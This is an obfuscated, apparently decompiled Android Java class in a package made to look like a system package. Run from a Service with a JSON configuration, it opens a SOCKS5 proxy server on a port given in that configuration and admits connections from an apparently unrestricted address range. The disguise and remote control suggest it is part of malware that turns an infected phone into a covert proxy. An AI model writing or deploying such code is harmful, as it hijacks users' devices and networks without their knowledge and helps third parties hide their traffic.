package android.system.sa;

import android.app.Service;
import android.system.e.InetRange;
import android.system.e.Proxy2;
import android.system.e.ProxyServer;
import android.system.e.a.IdentAuthenticator;
import java.io.IOException;
import java.util.Hashtable;
import java.util.StringTokenizer;
import org.json.JSONException;
import org.json.JSONObject;


public class SOCKS {
    private static JSONObject a;
    private static ProxyServer b;

    public static void a(Service service, JSONObject jSONObject) throws JSONException, NumberFormatException, IOException {
        a = jSONObject;
        int iIntValue = Integer.valueOf(a.getString("lport")).intValue();
        IdentAuthenticator identAuthenticator = new IdentAuthenticator();
        a(identAuthenticator);
        a();
        b = new ProxyServer(identAuthenticator);
        b.a(iIntValue, 5, null);
    }

    static boolean a(IdentAuthenticator identAuthenticator) {
        identAuthenticator.a(a(".;"), (Hashtable) null);
        return true;
    }

    static void a() throws JSONException, NumberFormatException {
        ProxyServer.a(Integer.valueOf(a.getString("iddleTimeout")).intValue());
        ProxyServer.b(Integer.valueOf(a.getString("acceptTimeout")).intValue());
        ProxyServer.c(Integer.valueOf(a.getString("udpTimeout")).intValue());
        ProxyServer.d(8192);
        b();
    }

    static void b() throws JSONException, NumberFormatException {
        Proxy2 proxy2B = Proxy2.b("localhost:" + a.getString("lport"));
        proxy2B.a(a(".;"));
        ProxyServer.a(proxy2B);
    }

    static InetRange a(String str) {
        InetRange inetRange = new InetRange();
        StringTokenizer stringTokenizer = new StringTokenizer(str, ";");
        while (stringTokenizer.hasMoreTokens()) {
            inetRange.a(stringTokenizer.nextToken());
        }
        return inetRange;
    }
}